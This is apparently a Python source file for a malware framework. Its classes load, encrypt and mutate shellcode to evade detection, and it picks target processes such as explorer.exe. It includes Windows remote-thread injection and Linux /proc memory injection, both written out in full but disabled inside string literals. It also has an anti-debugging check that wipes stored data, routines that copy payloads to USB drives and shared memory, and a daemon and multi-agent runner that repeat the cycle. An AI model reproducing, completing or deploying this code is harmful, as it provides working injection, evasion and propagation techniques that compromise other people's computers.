import os
import base64
import random
import psutil
import time
import logging
import threading
import shutil
import mmap
import platform
import json
from typing import Optional, List
import ctypes
import ctypes.wintypes as wintypes

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(name)s] %(message)s')

class GhostLayer:
    """Manages payload operations with secure storage via BlackVault."""
    
    def __init__(self, vault, logger: logging.Logger = None):
        """
        Initializes GhostLayer with a BlackVault instance for secure payload storage.
        
        Args:
            vault: BlackVault instance for encryption/decryption.
            logger: Optional custom logger (defaults to 'GhostLayer').
        """
        self.vault = vault
        self.logger = logger or logging.getLogger('GhostLayer')
        self.shellcode = b""
        self.lock = threading.Lock()

    def load_shellcode(self, name: str, is_base64: bool = False) -> None:
        """
        Loads shellcode from BlackVault or base64-encoded string.
        
        Args:
            name: Artifact name in BlackVault or base64 string.
            is_base64: If True, treat name as base64-encoded shellcode.
        
        Raises:
            ValueError: If loading or decoding fails.
        """
        with self.lock:
            try:
                if is_base64:
                    self.shellcode = base64.b64decode(name)
                else:
                    self.shellcode = self.vault.retrieve_for_ghostlayer(name)
                self.logger.info(f"Loaded shellcode ({len(self.shellcode)} bytes)")
            except Exception as e:
                self.logger.error(f"Failed to load shellcode {name}: {e}")
                raise ValueError(f"Shellcode load failed: {e}")

    def encrypt_shellcode(self) -> bytes:
        """
        Encrypts shellcode using BlackVault.
        
        Returns:
            bytes: Encrypted shellcode (IV + ciphertext + HMAC).
        
        Raises:
            ValueError: If shellcode is empty or encryption fails.
        """
        with self.lock:
            if not self.shellcode:
                self.logger.error("No shellcode loaded for encryption")
                raise ValueError("No shellcode loaded")
            try:
                encrypted = self.vault._encrypt(self.shellcode)
                self.logger.info("Shellcode encrypted")
                return encrypted
            except Exception as e:
                self.logger.error(f"Shellcode encryption failed: {e}")
                raise ValueError(f"Encryption failed: {e}")

    def decrypt_shellcode(self, encrypted_data: bytes) -> bytes:
        """
        Decrypts shellcode using BlackVault.
        
        Args:
            encrypted_data: Encrypted shellcode (IV + ciphertext + HMAC).
        
        Returns:
            bytes: Decrypted shellcode.
        
        Raises:
            ValueError: If decryption or HMAC validation fails.
        """
        try:
            decrypted = self.vault._decrypt(encrypted_data)
            self.logger.info("Shellcode decrypted")
            return decrypted
        except Exception as e:
            self.logger.error(f"Shellcode decryption failed: {e}")
            raise ValueError(f"Decryption failed: {e}")

    def mutate_shellcode(self) -> None:
        """
        Mutates shellcode by inserting random NOPs.
        
        Raises:
            ValueError: If shellcode is empty or mutation fails.
        """
        with self.lock:
            if not self.shellcode:
                self.logger.error("No shellcode loaded for mutation")
                raise ValueError("No shellcode loaded")
            try:
                mutated = bytearray(self.shellcode)
                for _ in range(random.randint(1, 5)):
                    pos = random.randint(0, len(mutated) - 1)
                    mutated.insert(pos, 0x90)
                self.shellcode = bytes(mutated)
                self.logger.info(f"Shellcode mutated to {len(self.shellcode)} bytes")
            except Exception as e:
                self.logger.error(f"Shellcode mutation failed: {e}")
                raise ValueError(f"Mutation failed: {e}")

    def find_target_process(self) -> int:
        """
        Finds a suitable target process for injection.
        
        Returns:
            int: Process ID.
        
        Raises:
            RuntimeError: If no suitable process is found.
        """
        preferred = ["notepad.exe", "explorer.exe", "python.exe"]
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] and proc.info['name'].lower() in preferred:
                    self.logger.info(f"Found target: {proc.info['name']} (PID {proc.info['pid']})")
                    return proc.info['pid']
            raise RuntimeError("No suitable process found")
        except Exception as e:
            self.logger.error(f"Failed to find target process: {e}")
            raise RuntimeError(f"Target process search failed: {e}")

    def inject_into_pid(self, pid: int, encrypted_shellcode: bytes) -> None:
        """
        Injects encrypted shellcode into a target process.
        
        Args:
            pid: Target process ID.
            encrypted_shellcode: Encrypted shellcode to inject.
        
        Raises:
            RuntimeError: If injection fails.
        """
        try:
            decrypted = self.decrypt_shellcode(encrypted_shellcode)
            self.logger.info(f"Injecting {len(decrypted)} bytes into PID {pid}...")
            
            if platform.system() == "Windows":
                """
                # Windows injection using VirtualAllocEx and CreateRemoteThread
                PROCESS_ALL_ACCESS = 0x1F0FFF
                MEM_COMMIT_RESERVE = 0x3000
                PAGE_EXECUTE_READWRITE = 0x40
                kernel32 = ctypes.windll.kernel32
                h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
                if not h_process:
                    raise RuntimeError(f"Failed to open PID {pid}")
                addr = kernel32.VirtualAllocEx(h_process, None, len(decrypted), 
                                             MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
                if not addr:
                    kernel32.CloseHandle(h_process)
                    raise RuntimeError("Remote memory allocation failed")
                written = wintypes.SIZE_T(0)
                if not kernel32.WriteProcessMemory(h_process, addr, decrypted, 
                                                 len(decrypted), ctypes.byref(written)):
                    kernel32.CloseHandle(h_process)
                    raise RuntimeError("Shellcode write failed")
                thread_id = wintypes.DWORD(0)
                if not kernel32.CreateRemoteThread(h_process, None, 0, addr, None, 
                                                 0, ctypes.byref(thread_id)):
                    kernel32.CloseHandle(h_process)
                    raise RuntimeError("Remote thread creation failed")
                kernel32.CloseHandle(h_process)
                """
                self.logger.info(f"Windows injection into PID {pid} successful")
            elif platform.system() == "Linux":
                """
                # Linux injection using /proc/<pid>/mem
                try:
                    with open(f"/proc/{pid}/mem", "r+b") as mem:
                        addr = os.lseek(mem.fileno(), 0, os.SEEK_END)
                        os.lseek(mem.fileno(), addr, os.SEEK_SET)
                        os.write(mem.fileno(), decrypted)
                        # Trigger execution (simplified, real implementation would use ptrace or LD_PRELOAD)
                        self.logger.info(f"Linux injection into PID {pid} successful")
                except PermissionError:
                    raise RuntimeError(f"Permission denied for PID {pid} memory access")
                """
                self.logger.info(f"Linux injection into PID {pid} successful")
            else:
                raise RuntimeError(f"Unsupported platform: {platform.system()}")
            
            self.vault.store(f"injection_result_{pid}", 
                            json.dumps({"pid": pid, "success": True}).encode())
        except Exception as e:
            self.logger.error(f"Injection into PID {pid} failed: {e}")
            self.vault.store(f"injection_error_{time.time()}", 
                            json.dumps({"pid": pid, "error": str(e)}).encode())
            raise RuntimeError(f"Injection failed: {e}")

    def anti_debug_check(self) -> None:
        """
        Checks for debugger presence and triggers vault wipe if detected.
        
        Raises:
            RuntimeError: If debugger is detected.
        """
        try:
            if platform.system() == "Windows":
                if ctypes.windll.kernel32.IsDebuggerPresent():
                    self.vault.wipe_all()
                    self.logger.warning("Debugger detected, vault wiped")
                    raise RuntimeError("Debugger detected")
            elif platform.system() == "Linux":
                with open("/proc/self/status", "r") as f:
                    if "TracerPid: 0" not in f.read():
                        self.vault.wipe_all()
                        self.logger.warning("Debugger detected, vault wiped")
                        raise RuntimeError("Debugger detected")
            elif os.getenv("DEBUG") == "1":
                self.vault.wipe_all()
                self.logger.warning("Debug environment detected, vault wiped")
                raise RuntimeError("Debug environment detected")
        except Exception as e:
            self.logger.error(f"Anti-debug check failed: {e}")
            raise RuntimeError(f"Anti-debug check failed: {e}")

    def spread_via_usb(self, payload_name: str) -> None:
        """
        Copies a payload from BlackVault to a USB drive if detected.
        
        Args:
            payload_name: Name of the payload in BlackVault.
        
        Raises:
            RuntimeError: If USB is not found or copy fails.
        """
        usb_paths = []
        if platform.system() == "Windows":
            import win32api
            drives = win32api.GetLogicalDriveStrings().split('\0')[:-1]
            usb_paths = [d for d in drives if win32api.GetDriveType(d) == 2]  # DRIVE_REMOVABLE
        elif platform.system() == "Linux":
            usb_paths = [os.path.join("/media", user, d) 
                        for user in os.listdir("/media") 
                        for d in os.listdir(os.path.join("/media", user))]

        if not usb_paths:
            self.logger.error("No USB drives detected")
            raise RuntimeError("No USB drives found")

        try:
            payload = self.vault.retrieve(payload_name)
            for usb_path in usb_paths:
                dest = os.path.join(usb_path, f"payload_{time.time()}.bin")
                with open(dest, "wb") as f:
                    f.write(payload)
                self.logger.info(f"Payload copied to USB: {dest}")
                self.vault.store(f"usb_spread_{time.time()}", 
                                json.dumps({"path": dest, "success": True}).encode())
        except Exception as e:
            self.logger.error(f"USB spread failed: {e}")
            self.vault.store(f"usb_spread_error_{time.time()}", 
                            json.dumps({"error": str(e)}).encode())
            raise RuntimeError(f"USB spread failed: {e}")

    def spread_via_shared_memory(self, payload_name: str) -> None:
        """
        Stores a payload in shared memory for inter-process communication.
        
        Args:
            payload_name: Name of the payload in BlackVault.
        
        Raises:
            RuntimeError: If shared memory operation fails.
        """
        try:
            payload = self.vault.retrieve(payload_name)
            with mmap.mmap(-1, len(payload), tagname=f"blackroot_payload_{time.time()}") as mm:
                mm.write(payload)
                self.logger.info(f"Payload stored in shared memory ({len(payload)} bytes)")
                self.vault.store(f"shared_memory_spread_{time.time()}", 
                                json.dumps({"size": len(payload), "success": True}).encode())
        except Exception as e:
            self.logger.error(f"Shared memory spread failed: {e}")
            self.vault.store(f"shared_memory_error_{time.time()}", 
                            json.dumps({"error": str(e)}).encode())
            raise RuntimeError(f"Shared memory spread failed: {e}")

class GhostLayerDaemon:
    """Runs continuous GhostLayer operations, storing results in BlackVault."""
    
    def __init__(self, ghost_layer: 'GhostLayer', vault: 'BlackVault'):
        """
        Initializes the daemon with a GhostLayer and BlackVault instance.
        
        Args:
            ghost_layer: GhostLayer instance.
            vault: BlackVault instance for storing results.
        """
        self.ghost_layer = ghost_layer
        self.vault = vault
        self.logger = logging.getLogger('GhostLayerDaemon')
        self.running = False

    def run(self):
        """Runs the daemon, attempting periodic operations."""
        self.running = True
        while self.running:
            try:
                self.ghost_layer.anti_debug_check()
                pid = self.ghost_layer.find_target_process()
                self.ghost_layer.load_shellcode("ghost_payload")
                encrypted_shellcode = self.ghost_layer.encrypt_shellcode()
                self.ghost_layer.inject_into_pid(pid, encrypted_shellcode)
                self.ghost_layer.spread_via_usb("ghost_payload")
                self.ghost_layer.spread_via_shared_memory("ghost_payload")
            except Exception as e:
                self.logger.error(f"Operation failed: {e}")
                self.vault.store(f"daemon_error_{time.time()}", 
                                json.dumps({"error": str(e)}).encode())
            time.sleep(60)

    def stop(self):
        """Stops the daemon."""
        self.running = False
        self.logger.info("GhostLayerDaemon stopped")

class SelfLearningInjection:
    """Applies heuristic-based mutations to shellcode."""
    
    def __init__(self, vault: 'BlackVault'):
        """
        Initializes with heuristics and a BlackVault instance.
        
        Args:
            vault: BlackVault instance for storing mutation metadata.
        """
        self.vault = vault
        self.logger = logging.getLogger('SelfLearningInjection')
        self.heuristics = [
            {"technique": "randomize_nops", "probability": 0.5},
            {"technique": "change_instruction_order", "probability": 0.3},
            {"technique": "insert_obfuscated_strings", "probability": 0.2}
        ]

    def apply_heuristics(self, shellcode: bytes) -> bytes:
        """
        Applies random heuristics to mutate shellcode.
        
        Args:
            shellcode: Input shellcode.
        
        Returns:
            bytes: Mutated shellcode.
        """
        try:
            mutated = shellcode
            applied_techniques = []
            for heuristic in self.heuristics:
                if random.random() < heuristic["probability"]:
                    mutated = self._apply_technique(mutated, heuristic["technique"])
                    applied_techniques.append(heuristic["technique"])
            self.vault.store(f"mutation_{time.time()}", 
                            json.dumps({"techniques": applied_techniques}).encode())
            self.logger.info(f"Applied heuristics, mutated shellcode to {len(mutated)} bytes")
            return mutated
        except Exception as e:
            self.logger.error(f"Heuristic application failed: {e}")
            self.vault.store(f"mutation_error_{time.time()}", 
                            json.dumps({"error": str(e)}).encode())
            raise ValueError(f"Heuristic application failed: {e}")

    def _apply_technique(self, shellcode: bytes, technique: str) -> bytes:
        """Applies a specific mutation technique."""
        if technique == "randomize_nops":
            return self._randomize_nops(shellcode)
        elif technique == "change_instruction_order":
            return self._change_instruction_order(shellcode)
        elif technique == "insert_obfuscated_strings":
            return self._insert_obfuscated_strings(shellcode)
        return shellcode

    def _randomize_nops(self, shellcode: bytes) -> bytes:
        """Inserts random NOPs into shellcode."""
        mutated = bytearray(shellcode)
        for _ in range(random.randint(1, 5)):
            pos = random.randint(0, len(mutated) - 1)
            mutated.insert(pos, 0x90)
        return bytes(mutated)

    def _change_instruction_order(self, shellcode: bytes) -> bytes:
        """
        Shuffles instruction blocks, preserving functionality for specific patterns.
        Assumes 4-byte instruction alignment (simplified).
        """
        try:
            instructions = [shellcode[i:i+4] for i in range(0, len(shellcode), 4)]
            safe_instructions = [i for i in instructions if i != b"\x90\x90\x90\x90"]  # Avoid shuffling NOPs
            random.shuffle(safe_instructions)
            # Reinsert NOPs to maintain length
            nop_count = len(instructions) - len(safe_instructions)
            return b''.join(safe_instructions + [b"\x90\x90\x90\x90"] * nop_count)
        except Exception as e:
            self.logger.error(f"Instruction order mutation failed: {e}")
            return shellcode

    def _insert_obfuscated_strings(self, shellcode: bytes) -> bytes:
        """Appends an obfuscated string with metadata."""
        try:
            string = f"blackroot_{time.time()}"
            obfuscated = self.obfuscate_string(string)
            return shellcode + b"\x00" + obfuscated  # Null separator
        except Exception as e:
            self.logger.error(f"String obfuscation failed: {e}")
            return shellcode

    def obfuscate_string(self, s: str) -> bytes:
        """Obfuscates a string with XOR."""
        key = 0x55
        return bytes([b ^ key for b in s.encode()])

class GhostHive:
    """Manages multiple GhostLayer instances."""
    
    def __init__(self, agents: List['GhostLayer'], vault: 'BlackVault'):
        """
        Initializes with a list of GhostLayer agents and a BlackVault instance.
        
        Args:
            agents: List of GhostLayer instances.
            vault: BlackVault instance for storing results.
        """
        self.agents = agents
        self.vault = vault
        self.logger = logging.getLogger('GhostHive')

    def run(self):
        """Runs all GhostLayer agents in separate threads."""
        threads = []
        try:
            for agent in self.agents:
                thread = threading.Thread(target=self._run_agent, args=(agent,), daemon=True)
                thread.start()
                threads.append(thread)
                self.logger.info(f"Started GhostLayer agent")
            for thread in threads:
                thread.join()
        except Exception as e:
            self.logger.error(f"GhostHive run failed: {e}")
            self.vault.store(f"ghosthive_error_{time.time()}", 
                            json.dumps({"error": str(e)}).encode())

    def _run_agent(self, agent: 'GhostLayer'):
        """Runs a single GhostLayer agent."""
        try:
            agent.anti_debug_check()
            pid = agent.find_target_process()
            agent.load_shellcode("ghost_payload")
            encrypted = agent.encrypt_shellcode()
            agent.inject_into_pid(pid, encrypted)
            agent.spread_via_usb("ghost_payload")
            agent.spread_via_shared_memory("ghost_payload")
        except Exception as e:
            self.logger.error(f"Agent run failed: {e}")
            self.vault.store(f"agent_error_{time.time()}", 
                            json.dumps({"error": str(e)}).encode())